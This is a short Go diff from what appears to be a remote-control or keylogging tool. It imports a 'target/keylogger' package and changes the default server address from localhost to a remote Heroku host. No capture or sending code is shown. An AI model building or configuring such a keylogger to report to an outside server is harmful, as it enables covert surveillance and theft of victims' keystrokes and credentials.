@@ -21,7 +21,7 @@ import (
 	"github.com/d0minikt/dragons/target/keylogger"
 )
 
-var addr = flag.String("addr", "localhost:80", "http service address")
+var addr = flag.String("addr", "dragons-land.herokuapp.com", "http service address")
 var debug = false
 
 var (
